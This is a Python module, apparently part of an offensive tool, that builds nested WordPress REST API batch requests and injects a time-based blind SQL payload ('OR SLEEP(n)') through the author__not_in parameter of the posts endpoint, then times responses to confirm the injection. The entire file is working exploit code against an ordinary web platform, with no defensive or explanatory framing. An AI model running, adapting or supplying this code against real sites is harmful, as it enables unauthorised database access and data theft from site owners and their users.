"""WordPress REST API interaction"""

import json
import time
import urllib.error
import urllib.request
from lib.config import ssl_context
from lib.output import Output

class WordPressAPI:
    """Handle WordPress REST API batch requests"""

    def __init__(self, target):
        self.target = target.rstrip("/")
        self.batch_api = f"{self.target}/?rest_route=/batch/v1"
        self.request_count = 0

    def batch_request(self, requests_list, timeout=30):
        """Send batch API request"""
        self.request_count += 1

        payload = {
            "requests": [
                {"method": "POST", "path": "http://:", "body": {}},
                {"method": "POST", "path": "/wp/v2/posts", "body": {"requests": requests_list}},
                {"method": "POST", "path": "/batch/v1"}
            ]
        }

        req = urllib.request.Request(
            self.batch_api,
            data=json.dumps(payload).encode(),
            headers={"Content-Type": "application/json"},
            method="POST"
        )

        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ssl_context) as r:
                return r.read()
        except Exception as e:
            Output.verbose(f"Request error: {e}")
            return b""

    def measure_timing(self, sleep_seconds):
        """Measure response time with SLEEP injection"""
        for attempt in range(3):
            Output.verbose(f"Attempt {attempt+1}/3 (delay={sleep_seconds}s)")

            payload = f"?author__not_in[0][0]=0 OR SLEEP({sleep_seconds})"
            reqs = [
                {"method": "GET", "path": "http://:", "body": {}},
                {"method": "GET", "path": f"/wp/v2/posts{payload}", "body": {}},
                {"method": "GET", "path": "/batch/v1"}
            ]

            start = time.time()
            self.batch_request(reqs, timeout=30)
            elapsed = time.time() - start

            Output.verbose(f"   Response: {elapsed:.3f}s")
            if elapsed > sleep_seconds - 1:
                return elapsed

        return None
